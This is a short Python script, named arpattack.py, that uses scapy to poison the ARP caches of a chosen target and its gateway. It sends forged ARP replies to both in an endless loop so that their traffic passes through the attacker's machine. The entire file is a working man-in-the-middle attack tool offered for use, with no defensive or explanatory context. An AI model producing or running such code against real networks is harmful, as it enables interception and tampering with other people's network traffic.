#!/usr/bin/python
import sys
import getopt
from scapy.all import *

def usage():
    print"Usage: sudo ./arpattack.py [-i interface] [-t target] [-g gateway]"

def main(argv):
    try:
        opts,args=getopt.getopt(argv,"hi:t:g:",["help","target=","gateway="])
    except getopt.GetoptError:
        usage()
        sys.exit(1)
    for opt,arg in opts:
        if opt in ("-h"):
            usage()
            sys.exit(0)
        elif opt in ("-i"):
            interface=arg
        elif opt in ("-t"):
            target_ip=arg
        elif opt in ("-g"):
            gateway_ip=arg
        else: 
            usage()
            sys.exit(1)
    src_mac=get_if_hwaddr(interface)
    target_mac=getmacbyip(target_ip)
    gateway_mac=getmacbyip(gateway_ip)
    
    pkt_target=Ether(src=src_mac,dst=target_mac)/ARP(hwsrc=src_mac,psrc=gateway_ip,hwdst=target_mac,pdst=target_ip,op=2)
    pkt_gateway=Ether(src=src_mac,dst=gateway_mac)/ARP(hwsrc=src_mac,psrc=target_ip,hwdst=gateway_mac,pdst=gateway_ip,op=2)
    
    while True:
        sendp(pkt_target,inter=1,iface=interface)
        sendp(pkt_gateway,inter=1,iface=interface)
if __name__ == "__main__":
    main(sys.argv[1:])

